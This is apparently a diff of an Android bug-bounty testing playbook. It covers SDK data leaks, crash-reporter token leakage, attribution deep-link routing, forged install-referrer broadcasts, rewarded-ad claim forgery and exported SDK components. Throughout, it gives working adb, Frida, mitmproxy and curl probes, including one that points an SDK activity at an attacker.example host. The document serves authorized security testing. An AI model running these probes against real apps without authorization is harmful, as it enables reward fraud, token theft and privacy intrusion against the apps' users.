 - **Escalation:** Combine with MASTG-TEST-0206 (undeclared PII on the wire) for the reportable "collects and shares X without declaring it" finding -> D20. If the exfiltrated field is an auth token, refile it as theft of sensitive data rather than privacy — at most vendors that is a materially higher band (Xiaomi, for example, runs a separate privacy table at High $500–$200 / Medium $200–$100 / Low $100–$50, well below its mobile security bands).
 - **Ruled out when:** The captured arguments are pseudonymous install identifiers and screen names only, with no email, phone, account id joined to an advertising id, precise location, health/financial attribute or token — across a full feature sweep including login, payment and KYC. Name the flows you drove.
 
@@ -1687,7 +1753,7 @@ frida-trace -U -p $(adb shell pidof com.target.app) \
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `privacy_concerns.unnecessary_data_collection` (VARIES); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) for the data itself |
+| **VRT** | `privacy_concerns.unnecessary_data_collection` (varies); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) for the data itself |
 | **Attacker** | AM-08 |
 | **Applies to** | Apps serving EU/California users, or any app with a published privacy policy |
 | **Requires** | device, mitm |
@@ -1700,13 +1766,30 @@ adb uninstall com.target.app; adb install target.apk
 mitmdump -w first_run.flows &
 adb shell monkey -p com.target.app -c android.intent.category.LAUNCHER 1
 # ... decline every consent dialog, then stop the capture
-mitmdump -nr first_run.flows -s /dev/stdin <<'PY'
+cat > first_run_hosts.py <<'PY'
 def response(f):
     print(f.request.timestamp_start, f.request.pretty_host, f.request.path[:80])
 PY
+mitmdump -nr first_run.flows -s first_run_hosts.py --set flow_detail=0 > first_run_hosts.txt; wc -l first_run_hosts.txt   # -s needs a real file; `-q | grep` prints no flow lines at all
 # which of those hosts are third-party?
-mitmdump -nr first_run.flows -q | grep -iE 'appsflyer|adjust|branch|amplitude|mixpanel|segment|facebook|onesignal|sentry|bugsnag|crashlytics|doubleclick|applovin|unity3d' | sort -u
+grep -iE 'appsflyer|adjust|branch|amplitude|mixpanel|segment|facebook|onesignal|sentry|bugsnag|crashlytics|doubleclick|applovin|unity3d' first_run_hosts.txt | sort -u
+# analytics uploads are gzip + protobuf; the host does not attribute them to THIS app on a shared device — decode the body and read the app id / installation id / user properties
+cat > decode_uploads.py <<'PY'
+import gzip, subprocess, urllib.parse
+from mitmproxy import http
+HOSTS = ('app-measurement.com', 'google-analytics.com', 'analytics.google.com', 'firebaseinstallations.googleapis.com')
+def response(f: http.HTTPFlow):
+    if not f.request.pretty_host.endswith(HOSTS): return
+    b = f.request.raw_content or b''
+    if b[:2] == b'\x1f\x8b': b = gzip.decompress(b)
+    print(f.request.timestamp_start, f.request.pretty_host, f.request.path[:60])
+    if b[:1] in (b'v', b'{') or b'=' in b[:40]:
+        print(urllib.parse.parse_qs(b.decode('utf-8', 'replace'))); return        # GA4 /g/collect and /batch are key=value
+    print(subprocess.run(['protoc', '--decode_raw'], input=b, capture_output=True).stdout.decode('utf-8', 'replace')[:1500])
+PY
+mitmdump -nr first_run.flows -s decode_uploads.py --set flow_detail=0
 ```
+  The `1:<sender>:android:<hash>` app id, the Firebase installation id and the `user_property` / `event` records are the attribution; a `firebase_id` / `cid` that matches the device's own install (`files/PersistedInstallation.*.json`) proves the upload is this app's.
   Note the API-level gate for the harness: **targetSdk < 24** trusts user-added CAs, so a user CA suffices; at targetSdk 24+ you need a `network_security_config` override or a system CA, and on **API 34+** the trust store moved to the Conscrypt APEX so `/system/etc/security/cacerts` is ignored at runtime. AM-07 is tester convenience, not an attacker model — say so in the report.
 - **Proof:** Requests to analytics, attribution or ad hosts carrying a device identifier or PII, **timestamped before** the consent dialog was accepted or after it was declined. The timestamps are the evidence; a host list is not.
 - **Escalation:** -> D20; MASVS-PRIVACY-4 additionally requires re-prompting and updated disclosures when the app collects more than originally specified, so check version over version. This is the form that carries regulatory weight, which is why programs pay for it.
@@ -1717,7 +1800,7 @@ mitmdump -nr first_run.flows -q | grep -iE 'appsflyer|adjust|branch|amplitude|mi
 | | |
 |---|---|
 | **Severity ceiling** | High (Critical if the vendor console exposes multiple users' sessions and you can show it) |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
 | **Attacker** | AM-08 |
 | **Applies to** | Apps embedding UXCam, Smartlook, Clarity, FullStory, Glassbox, Contentsquare, Quantum Metric, LogRocket or similar |
 | **Requires** | device, mitm |
@@ -1726,8 +1809,8 @@ mitmdump -nr first_run.flows -q | grep -iE 'appsflyer|adjust|branch|amplitude|mi
 - **Test:** Masking in these SDKs is opt-in per view. They routinely capture card numbers, CVVs, OTPs, recovery codes and document scans — including on screens the app excludes from screenshots with `FLAG_SECURE`, because the SDK reads the view hierarchy rather than the framebuffer.
 - **How:**
 ```bash
-grep -rniE 'uxcam|smartlook|clarity|fullstory|glassbox|contentsquare|quantummetric|logrocket|sessionreplay' out/sources/ out/AndroidManifest.xml
-grep -rniE 'occludeSensitiveView|setSensitive|markSensitive|hideSensitive|maskView|maskAllInputs|addPrivateView|privateView|FS\.privacy|setPrivate' out/sources/
+grep -rniE 'uxcam|smartlook|clarity|fullstory|glassbox|contentsquare|quantummetric|logrocket|sessionreplay' $S/ $MF
+grep -rniE 'occludeSensitiveView|setSensitive|markSensitive|hideSensitive|maskView|maskAllInputs|addPrivateView|privateView|FS\.privacy|setPrivate' $S/
 # capture the upload while typing canaries
 mitmdump -s dump.py -q '~u uxcam|smartlook|clarity|fullstory|quantummetric'
 ```
@@ -1741,7 +1824,7 @@ mitmdump -s dump.py -q '~u uxcam|smartlook|clarity|fullstory|quantummetric'
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES); Critical if an auth token is included, refiled as theft of sensitive data |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); Critical if an auth token is included, refiled as theft of sensitive data |
 | **Attacker** | AM-08 |
 | **Applies to** | Apps with Crashlytics, Sentry, Bugsnag, Instabug, AppCenter or Datadog |
 | **Requires** | device, mitm |
@@ -1750,11 +1833,12 @@ mitmdump -s dump.py -q '~u uxcam|smartlook|clarity|fullstory|quantummetric'
 - **Test:** This is the item that converts a D20 logcat observation — whose severity is capped by on-device reachability — into a real cross-boundary leak, because the crash reporter carries the log off the device to a third party. Check the reporter's configuration and read an actual uploaded report.
 - **How:**
 ```bash
-grep -rniE 'Crashlytics|Sentry|Bugsnag|Instabug|AppCenter|Datadog|setCustomKey|setUserIdentifier|leaveBreadcrumb|recordException|beforeSend|attachLogs|setTag|addAttachment' out/sources/ -A4
-grep -rn 'HttpLoggingInterceptor\|Level\.BODY\|Level\.HEADERS' out/sources/
+grep -rniE 'Crashlytics|Sentry|Bugsnag|Instabug|AppCenter|Datadog|setCustomKey|setUserIdentifier|leaveBreadcrumb|recordException|beforeSend|attachLogs|setTag|addAttachment' $S/ -A4
+grep -rn 'HttpLoggingInterceptor\|Level\.BODY\|Level\.HEADERS' $S/
 # force a crash and capture the upload
 adb logcat -c
-adb shell am crash com.target.app 2>/dev/null || adb shell run-as com.target.app kill -11 $(adb shell pidof com.target.app)
+adb shell am crash com.target.app 2>/dev/null                                            # stock device
+adb -s emulator-5554 shell "su 0 sh -c 'kill -11 $(pidof com.target.app)'"               # rooted AVD fallback; run-as kill needs a debuggable package
 # then in the proxy, decompress and search the outgoing report
 ```
 - **Proof:** The outgoing crash/report payload containing the session token, an email, a PAN or a full request body, with the vendor host visible. `HttpLoggingInterceptor` left at `Level.BODY` in a release build is the classic supplier — it writes whole request and response bodies including `Authorization` headers to logcat, and the reporter then ships them.
@@ -1766,7 +1850,7 @@ adb shell am crash com.target.app 2>/dev/null || adb shell run-as com.target.app
 | | |
 |---|---|
 | **Severity ceiling** | High (Medium where an SDK merely *can* reach the token; High where a captured flow shows it transmitting) |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
 | **Attacker** | AM-08 malicious third-party SDK |
 | **Applies to** | All; weight it up for apps carrying session-replay, attribution, chat-support, ad or crash SDKs |
 | **Requires** | device, frida, mitm |
@@ -1792,10 +1876,10 @@ Java.perform(function () {
 ```
 ```bash
 adb shell dumpsys package com.target.app | grep -i 'requested permissions' -A40
-mitmdump -nr session.flow -q | grep -iE 'Authorization: Bearer|token=' | sort -u
+mitmdump -nr session.flow --set flow_detail=3 | grep -iE 'Authorization: Bearer|token=' | sort -u   # -q prints nothing; flow_detail>=2 prints headers
 ```
 - **Proof:** A log line where a **non-first-party** class name reads the auth preferences file, registers lifecycle callbacks (screen access), or installs an HTTP interceptor (token access) — plus, ideally, a proxied flow to that vendor's domain carrying the token or a screen field.
-- **Escalation:** -> D20 undisclosed third-party data sharing; -> D17 if any SDK loads remote code, at which point the SDK vendor's CDN becomes your AM-09 attacker. On **Android 13+** an ads SDK running in the SDK Runtime is the one exception — note it if applicable, and note it does not isolate SDKs from each other.
+- **Escalation:** -> D20 undisclosed third-party data sharing; -> D17 if any SDK loads remote code, at which point the SDK vendor's CDN becomes your AM-09 attacker. Treat every bundled SDK as in-process. The Android 13 SDK Runtime was the one documented exception, but the retirement of Privacy Sandbox on Android (SDK Runtime included) was announced in October 2025 — only a `<uses-sdk-library>` entry in the merged manifest (D18-066) shows an SDK actually loaded out-of-process, and even then there is no isolation between SDKs of the same app. Verify the current status before citing the exception.
 - **Ruled out when:** No third-party class appears in the prefs/lifecycle/interceptor logs across a full feature sweep, and no non-first-party host receives a request carrying a token. Name the flows driven and the session length.
 
 ### D18-062 · Attribution SDK acting as a second, undocumented deep-link router
@@ -1803,7 +1887,7 @@ mitmdump -nr session.flow -q | grep -iE 'Authorization: Bearer|token=' | sort -u
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) — rated on the route reached |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) — rated on the route reached |
 | **Attacker** | AM-02 remote, one click |
 | **Applies to** | Apps bundling Branch, AppsFlyer, Adjust or a similar attribution SDK |
 | **Requires** | deeplink, device |
@@ -1812,14 +1896,16 @@ mitmdump -nr session.flow -q | grep -iE 'Authorization: Bearer|token=' | sort -u
 - **Test:** These SDKs register their own link handlers and accept a routing parameter in the attribution payload. That is a second router, sitting beside the app's own deep-link handling and usually bypassing its validation entirely.
 - **How:**
 ```bash
-grep -rn 'io.branch\|com.appsflyer\|com.adjust' out/sources/ | cut -d: -f1 | sort -u
-grep -n -B4 -A14 'branch\|appsflyer\|adjust' out/AndroidManifest.xml
-adb shell am start -a android.intent.action.VIEW -d 'https://<sub>.app.link/x?$deeplink_path=pay/confirm&amount=1'
-adb shell am start -a android.intent.action.VIEW -d 'targetapp://?af_dp=targetapp%3A%2F%2Fpay%2Fconfirm'
-adb shell am start -a android.intent.action.VIEW -d 'targetapp://?adj_deeplink=targetapp%3A%2F%2Fadmin'
+grep -rn 'io.branch\|com.appsflyer\|com.adjust' $S/ | cut -d: -f1 | sort -u
+grep -n -B4 -A14 'branch\|appsflyer\|adjust' $MF
+# the device shell re-parses the argument string: quote the remote command once for the host and once for the device,
+# or `$deeplink_path` expands to nothing and `&` backgrounds the command — the probe silently sends a different intent
+adb shell "am start -a android.intent.action.VIEW -d 'https://<sub>.app.link/x?\$deeplink_path=pay/confirm&amount=1'"
+adb shell "am start -a android.intent.action.VIEW -d 'targetapp://?af_dp=targetapp%3A%2F%2Fpay%2Fconfirm'"
+adb shell "am start -a android.intent.action.VIEW -d 'targetapp://?adj_deeplink=targetapp%3A%2F%2Fadmin'"
 ```
 - **Proof:** The app navigating to the internal route named in the attribution parameter, screen-recorded, with the launched activity confirmed via `adb shell dumpsys activity activities | grep -E 'ResumedActivity|topResumedActivity'`.
-- **Escalation:** -> D09 deep links and -> D15 for whatever the route does; attribution fraud alone -> D23 rewarded-install payouts. Note the gate: below **targetSdk 31** a component with an intent-filter and no explicit `android:exported` is exported by default, which is how many of these handlers become reachable.
+- **Escalation:** -> D09 deep links and -> D15 for whatever the route does; attribution fraud alone -> D23 rewarded-install payouts. Exported-by-default gate (below targetSdk 31): see D18-006 — it is how many of these handlers become reachable.
 - **Ruled out when:** The SDK's deferred-deep-link callback passes through the app's own allow-list before routing (show the validation call site), and every crafted parameter lands on the app's fallback screen. Show the resumed activity for each attempt.
 
 ### D18-063 · Install-referrer / attribution receiver exported without a permission
@@ -1827,7 +1913,7 @@ adb shell am start -a android.intent.action.VIEW -d 'targetapp://?adj_deeplink=t
 | | |
 |---|---|
 | **Severity ceiling** | Medium (Low standalone; Medium–High where referrer data drives a reward or payout) |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 zero-permission local app |
 | **Applies to** | Apps with an `INSTALL_REFERRER` receiver |
 | **Requires** | exported-receiver, device |
@@ -1836,11 +1922,10 @@ adb shell am start -a android.intent.action.VIEW -d 'targetapp://?adj_deeplink=t
 - **Test:** Attribution receivers exported with no guarding permission let any installed app forge attribution data.
 - **How:**
 ```bash
-grep -n -B4 -A8 'INSTALL_REFERRER' out/AndroidManifest.xml
-adb shell am broadcast -n com.target.app/<receiver> \
-  -a com.android.vending.INSTALL_REFERRER --es referrer 'utm_source=attacker&utm_campaign=zx83qp4r'
-# did it persist?
-adb shell run-as com.target.app cat shared_prefs/*.xml | grep -i 'referrer\|utm'
+grep -n -B4 -A8 'INSTALL_REFERRER' $MF
+adb shell "am broadcast -n com.target.app/<receiver> -a com.android.vending.INSTALL_REFERRER --es referrer 'utm_source=zx83qp4r&utm_campaign=zx83qp4r'"   # & and = must reach am, not the device sh; marker per D18-070 (no 'attacker')
+# did it persist? run-as needs a debuggable package: read the sandbox on the rooted AVD
+adb -s emulator-5554 shell "su 0 sh -c 'grep -il \"referrer\|utm\" /data/data/com.target.app/shared_prefs/*.xml'"
 ```
 - **Proof:** The forged referrer persisted in the app's storage, or echoed in an outbound analytics request captured in the proxy. Use a random marker in the referrer so you can prove the value is yours.
 - **Escalation:** -> D23 if the referrer influences a referral bonus, coupon or partner payout; that is what moves it out of Low.
@@ -1851,7 +1936,7 @@ adb shell run-as com.target.app cat shared_prefs/*.xml | grep -i 'referrer\|utm'
 | | |
 |---|---|
 | **Severity ceiling** | High (ad content reaching a bridge or `file://`); Medium for reward fraud |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the bridge reach; `broken_access_control.privilege_escalation` (VARIES) for the reward |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) for the bridge reach; `broken_access_control.privilege_escalation` (varies) for the reward |
 | **Attacker** | AM-09 malicious backend/CDN (the ad network or a mediation partner) for the content half; AM-05 for the reward half |
 | **Applies to** | Ad-supported apps |
 | **Requires** | ads-sdk, device |
@@ -1860,10 +1945,10 @@ adb shell run-as com.target.app cat shared_prefs/*.xml | grep -i 'referrer\|utm'
 - **Test:** Ad SDKs render remote HTML in WebViews inside the app's process. Two questions: does the ad WebView have file/content access or an injected bridge, and is rewarded-ad completion verified server-side.
 - **How:**
 ```bash
-grep -rn 'com.google.android.gms.ads\|AdMob\|applovin\|ironsource\|vungle\|chartboost\|inmobi\|com.unity3d.ads\|mopub\|smaato\|fyber' out/sources/ | cut -d: -f1 | sort -u
-grep -rnE 'setAllowFileAccess\(true\)|setAllowFileAccessFromFileURLs\(true\)|setAllowUniversalAccessFromFileURLs\(true\)|setAllowContentAccess\(true\)|addJavascriptInterface|setMixedContentMode' out/sources/ \
+grep -rn 'com.google.android.gms.ads\|AdMob\|applovin\|ironsource\|vungle\|chartboost\|inmobi\|com.unity3d.ads\|mopub\|smaato\|fyber' $S/ | cut -d: -f1 | sort -u
+grep -rnE 'setAllowFileAccess\(true\)|setAllowFileAccessFromFileURLs\(true\)|setAllowUniversalAccessFromFileURLs\(true\)|setAllowContentAccess\(true\)|addJavascriptInterface|setMixedContentMode' $S/ \
   | grep -iE 'ad|mraid|vast|creative'
-grep -rnE 'onUserEarnedReward|onRewardedVideoCompleted|grantReward|rewardUser' out/sources/
+grep -rnE 'onUserEarnedReward|onRewardedVideoCompleted|grantReward|rewardUser' $S/
 # does the reward land on a client call?
 curl -s -i -X POST https://api.target/v1/rewards/claim -H "Authorization: Bearer $T" \
   -H 'Content-Type: application/json' -d '{"ad_unit":"<id>","completed":true}' | head -10
@@ -1878,7 +1963,7 @@ curl -s -i -X POST https://api.target/v1/rewards/claim -H "Authorization: Bearer
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `privacy_concerns.unnecessary_data_collection` (VARIES) for the egress; rate up where a pre-auth config fetch is a control-plane injection point |
+| **VRT** | `privacy_concerns.unnecessary_data_collection` (varies) for the egress; rate up where a pre-auth config fetch is a control-plane injection point |
 | **Attacker** | AM-08; AM-09 for the config-fetch half |
 | **Applies to** | Any app using AndroidX App Startup |
 | **Requires** | device, mitm |
@@ -1887,9 +1972,9 @@ curl -s -i -X POST https://api.target/v1/rewards/claim -H "Authorization: Bearer
 - **Test:** Every `<meta-data android:value="androidx.startup" />` names an `Initializer` that runs in `InitializationProvider.onCreate()` — before the launcher activity, before any PIN or biometric gate, and before any consent screen. Audit what those initialisers do: fetch remote config, open a socket, read a token, register a listener, send telemetry carrying identifiers.
 - **How:**
 ```bash
-grep -nB2 -A4 'androidx.startup' out/AndroidManifest.xml
-for c in $(grep -oE 'android:name="[^"]*Initializer"' out/AndroidManifest.xml | cut -d'"' -f2); do
-  echo "== $c"; f=$(echo "$c" | tr '.' '/'); sed -n '1,80p' "out/sources/$f.java" 2>/dev/null \
+grep -nB2 -A4 'androidx.startup' $MF
+for c in $(grep -oE 'android:name="[^"]*Initializer"' $MF | cut -d'"' -f2); do
+  echo "== $c"; f=$(echo "$c" | tr '.' '/'); sed -n '1,80p' "$S/$f.java" 2>/dev/null \
     | grep -nE 'http|OkHttp|Retrofit|SharedPreferences|getString|Firebase|init\(|Socket'
 done
 adb shell am force-stop com.target.app && adb logcat -c
@@ -1905,17 +1990,16 @@ adb shell monkey -p com.target.app 1 ; adb logcat -d | head -100
 | | |
 |---|---|
 | **Severity ceiling** | Medium |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) for a component; `privacy_concerns.unnecessary_data_collection` (VARIES) for a permission |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) for a component; `privacy_concerns.unnecessary_data_collection` (varies) for a permission |
 | **Attacker** | AM-03 for components; AM-08 for permissions and background execution |
 | **Applies to** | All; the FGS-type half applies at targetSdk 34+ |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/about/versions/13/behavior-changes-13` ("If SDKs declare this permission, it auto-merges into app manifest" — stated for `AD_ID`); `developer.android.com/develop/background-work/services/fgs/service-types`; `developer.android.com/about/versions/14/behavior-changes-14` (Play Console FGS type declaration) |
 
 - **Test:** The app's effective attack surface is larger than its own code, and manifest merge is how. Review the **merged** manifest, not the source one: `AD_ID`, `QUERY_ALL_PACKAGES`, foreground-service types and `<uses-sdk-library>` arrive from AARs. Attribute each to a named dependency.
 - **How:**
 ```bash
-apktool d -f target.apk -o out && xmllint --format out/AndroidManifest.xml > merged.xml
-diff <(xmllint --format app/src/main/AndroidManifest.xml) merged.xml | head -80   # when you have the source tree
-grep -nE 'ADDED from|MERGED from' app/build/outputs/logs/manifest-merger-release-report.txt
+# take merged.xml and the attributed component table from D18-006 (same decompile, same merger report); add:
 grep -n 'uses-permission' merged.xml | grep -iE 'AD_ID|QUERY_ALL_PACKAGES|PACKAGE_USAGE_STATS|READ_PHONE_STATE|ACCESS_BACKGROUND_LOCATION'
 grep -n -B4 'foregroundServiceType' merged.xml
 grep -n '<service' merged.xml | grep -v 'com.target.app'
@@ -1923,7 +2007,7 @@ grep -n -A6 'com.google.android.gms.metadata.ModuleDependencies' merged.xml
 ```
   The documented Photo Picker backport declaration is `android:enabled="false"`, `android:exported="false"` with a `photopicker_activity:0:required` meta-data — a deviation such as `exported="true"` means someone hand-edited it.
 - **Proof:** The merger report attributing a dangerous permission, a `foregroundServiceType="dataSync"` or an exported component to a named third-party AAR. Without the build tree, the package-prefix attribution from D18-006 plus the SDK's published manifest is sufficient.
-- **Escalation:** -> D03/D04/D05/D06 for the component; -> D20 for the permission and for persistent background execution granted to a third party inside the app's UID. Note the gates: below **targetSdk 30** package visibility is free, so `QUERY_ALL_PACKAGES` matters only at 30+; below **targetSdk 31** a filtered component without an explicit `exported` attribute is exported.
+- **Escalation:** -> D03/D04/D05/D06 for the component; -> D20 for the permission and for persistent background execution granted to a third party inside the app's UID. Note the gates: below **targetSdk 30** package visibility is free, so `QUERY_ALL_PACKAGES` matters only at 30+; the exported-by-default gate (below targetSdk 31) is stated once in D18-006.
 - **Ruled out when:** Every permission and FGS type in the merged manifest maps to a first-party feature you can name, and no third-party component is exported. Produce the attribution table, not a summary.
 
 ### D18-067 · SDK-declared exported component: prove ownership so the report is not closed as "third party"
@@ -1931,7 +2015,7 @@ grep -n -A6 'com.google.android.gms.metadata.ModuleDependencies' merged.xml
 | | |
 |---|---|
 | **Severity ceiling** | Critical (inherits the SDK defect's impact, rated against the host app) |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) — rated on what it exposes |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) — rated on what it exposes |
 | **Attacker** | AM-03 |
 | **Applies to** | All |
 | **Requires** | device |
@@ -1941,19 +2025,20 @@ grep -n -A6 'com.google.android.gms.metadata.ModuleDependencies' merged.xml
 - **How:**
 ```bash
 # 1) it ships in THIS app and is exported HERE
-grep -nE 'exported="true"' out/AndroidManifest.xml | grep -v 'com\.target\.'
+grep -nE 'exported="true"' $MF | grep -v 'com\.target\.'
 # 2) it is reachable by a zero-permission app on a stock device (shell UID holds no app permissions)
 adb shell am start -n com.target.app/com.vendor.sdk.SomeActivity --es u 'https://attacker.example/'
 adb shell dumpsys window | grep mCurrentFocus
-# 3) the impact lands on THIS app's data and users, not the vendor's
-adb shell run-as com.target.app ls -la files/ databases/ shared_prefs/
+# 3) impact lands on THIS app's data — run-as needs a debuggable package; use the rooted AVD for the sandbox view, and on the
+#    stock device prove impact by what comes BACK to the attacker (result Intent, returned URI, a request to your host)
+adb -s emulator-5554 shell "su 0 sh -c 'ls -la /data/data/com.target.app/files /data/data/com.target.app/shared_prefs'"
 # 4) record the SDK version and whether a fixed version exists
-grep -rn 'versionName\|SDK_VERSION\|BuildConfig.VERSION' out/sources/com/vendor/
+grep -rn 'versionName\|SDK_VERSION\|BuildConfig.VERSION' $S/com/vendor/
 unzip -l target.apk | grep -iE 'META-INF/.*\.version'
 ```
 - **Proof:** The three artefacts above together. Point 3 is the one that converts "report it upstream" into "your users are affected today" — show the file that moved, the token that returned, or the intent that was forwarded, inside the target app's own sandbox.
 - **Escalation:** -> D06/D08/D10 for the sink reached. If a fixed SDK version exists, it is additionally a -> D02/D17 outdated-dependency finding with a concrete remediation, which raises the payout odds. Note in the report that the same check applies to every other app the client ships with that SDK — SDK bugs are fleet-wide.
-- **Ruled out when:** Every non-first-party component is `exported="false"` without `grantUriPermissions`, or the exported ones are inert — launched from the shell UID they render a static screen and touch no app data (show the resumed activity and the unchanged `run-as` listing). Note the gate: below **targetSdk 31** a filtered component with no explicit `exported` attribute is exported by default, and below **targetSdk 17** providers are exported by default.
+- **Ruled out when:** Every non-first-party component is `exported="false"` without `grantUriPermissions`, or the exported ones are inert — launched from the shell UID they render a static screen and touch no app data (show the resumed activity and the unchanged sandbox listing from the rooted AVD). Exported-by-default gate (below targetSdk 31): see D18-006, and below **targetSdk 17** providers are exported by default.
 
 ### D18-068 · Shadow API: the backend host hardcoded in the app is an older version than the web client's
 
@@ -2002,6 +2087,7 @@ curl -s -H 'Accept: application/vnd.company.v1+json'   "https://api.target.examp
 | **VRT** | n/a — validation discipline |
 | **Attacker** | n/a |
 | **Applies to** | Every unauthenticated probe in this chapter against a callable function, a BaaS REST route or an app API endpoint |
+| **Requires** | — |
 | **Maps to** | The false-positive discipline in the bug-hunting corpus |
 
 - **Test:** A `400 "field X is required"` returned to an unauthenticated request does **not** prove you passed authentication. Many stacks run a body parser, schema validator or sanitiser **in front of** the auth middleware, so a validation error is emitted before auth ever executes. Firebase callables in particular reject a body without a `data` envelope before checking the caller's token.
@@ -2025,9 +2111,10 @@ curl -s -i -X POST "$FN" -H 'Content-Type: application/json' -d '{"data":{"id":"
 | **VRT** | n/a — validation discipline |
 | **Attacker** | n/a |
 | **Applies to** | Every enumeration in this chapter: bucket permutations, RTDB path sweeps, key restriction checks, token id sweeps |
+| **Requires** | — |
 | **Maps to** | The corpus's Shell-Loop Ban; Marker Discipline; the Statistical-Sample Rule |
 
-- **Test:** Shell array expansion fails **silently**. A loop over an array that the previous command did not populate produces zero iterations, no error, and output that looks complete. The corpus records an engagement that lost roughly fifty probes' worth of testing to exactly this. Every negative in this chapter's ruled-out register depends on the sweep having actually run.
+- **Test:** The loop ban is chapter-independent (D01-080 states it once; D25 repeats it for its own sweeps) — this item is the D18-specific gate: counts reconcile against `wc -l` of the input file named in the item, the marker is absent from the *baseline read* before any write claim, and every "unrestricted key" claim carries the body diff of D18-011's two calls (D18-071). Shell array expansion fails **silently**. A loop over an array that the previous command did not populate produces zero iterations, no error, and output that looks complete. The corpus records an engagement that lost roughly fifty probes' worth of testing to exactly this. Every negative in this chapter's ruled-out register depends on the sweep having actually run.
 - **How:** Loops of five or fewer hard-coded items in shell are fine. Anything iterating a list, a file or a computed range goes to Python with `try/except` per iteration, explicit per-iteration logging, and a final count compared against the input count:
 ```bash
 wc -l buckets.txt rtdb_paths.txt words.txt        # input counts, recorded before the sweep
@@ -2048,6 +2135,7 @@ tail -1 sweep.log                                 # the script's own "probed=N h
 | **VRT** | n/a — validation discipline |
 | **Attacker** | n/a |
 | **Applies to** | Every restriction check (D18-009 to D18-012), every write probe, every bypass claim |
+| **Requires** | — |
 | **Maps to** | The corpus's Body-Diff Rule ("status-code-only claims are the most common rejected-as-N/A category on bug-bounty platforms") and Server-Policy-vs-State |
 
 - **Test:** A bypass or an "unrestricted key" claim requires a response **body** differential, not a status code. A 200 with a byte-identical body is not a bypass. Equally, a server-side policy that always denies is not a state oracle — establish whether the differentiator tracks *your input* or a fixed deny-list.
@@ -2072,6 +2160,7 @@ for h in "" "-H X-Android-Package:$PKG"; do curl -s $h "$URL" | wc -c; curl -s $
 | **VRT** | n/a — reporting discipline |
 | **Attacker** | n/a |
 | **Applies to** | Every finding in this chapter |
+| **Requires** | — |
 | **Maps to** | The corpus's evidence-hygiene, pre-severity-gate, retraction and chain-filing guidance; HackerOne's leaked-credential standard; Intigriti's triage standards on out-of-scope testing |
 
 - **Test:** Cloud findings distribute other people's data by construction, so the evidence rules are stricter here than anywhere else in the engagement, and the severity claim is the thing the gate runs against.
@@ -2095,13 +2184,152 @@ grep -i 'authorization\|"cookie"\|apikey' out.sanitized.har | head -20   # verif
 - **Escalation:** None — it is what converts correct findings into paid ones.
 - **Ruled out when:** Not applicable; this is a gate applied to every submission.
 
+### D18-073 · Compiled-in environment table: non-production endpoints shipped in the release build, and the selector that picks them
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for the table; `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) when a non-prod host is reachable; rate at the redirected credential when AM-02/AM-03 can flip the selector |
+| **Attacker** | AM-01 for the table; AM-02 / AM-03 / AM-11 for the selector |
+| **Applies to** | Apps whose release build carries more than one backend environment (prod / staging / dev / loopback) |
+| **Requires** | backend-api |
+| **Maps to** | MASWE-0004; API8:2023; the D18-055 / D18-068 staging-host class |
+| **Record** | logs/D18-073.txt; requests/E-NNN.http for the redirected request |
+
+- **Test:** A release build that still holds a staging, dev or `http://localhost:<port>` entry in an environment enum, plus a selector (debug menu, preference, remote flag, deep-link parameter, restored backup value) that chooses among them. The table is a P3 leak of internal hosts; the selector decides whether an attacker can point an authenticated client at a weaker or cleartext backend. D18-055 compares keys across builds and D18-068 diffs API versions — neither asks whether the environment can be flipped.
+- **How:**
+```bash
+grep -rnE 'https?://[a-z0-9.-]+(:[0-9]+)?/' "$S" | grep -iE 'staging|stg|dev|qa|uat|sandbox|preprod|internal|localhost|127\.0\.0\.1|10\.0\.2\.2' | sort -u
+grep -rnE 'http://(localhost|127\.0\.0\.1|10\.0\.2\.2)(:[0-9]+)?' "$S" "$R" | sort -u
+# the selector: who reads the environment choice, and can it be set from outside the app?
+grep -rnE '(getString|getInt|getBoolean)\("?(env|environment|backend|server|base_url|endpoint)' "$S" | head
+grep -rnE 'getQueryParameter\("?(env|environment|server|host|base_url)' "$S"
+grep -rnE 'BuildConfig\.(FLAVOR|BUILD_TYPE|DEBUG)' "$S" | grep -iE 'url|env|host' | head
+```
+  Then set the selector by every external route the code admits (deep link -> D09, restored backup -> D11, remote flag -> D18-025) and watch in the proxy which host the next authenticated request reaches.
+- **Proof:** The environment table with `file:line`; for the selector, an authenticated request (bearer present, value masked) arriving at the non-production host after a change made from an attacker position — not from a debug menu you opened yourself.
+- **Escalation:** A reachable non-prod host -> D18-068 and -> D15; a cleartext entry the selector can reach -> D14; a selector reachable by deep link or backup -> D09 / D11 chain, rated at the credential it redirects.
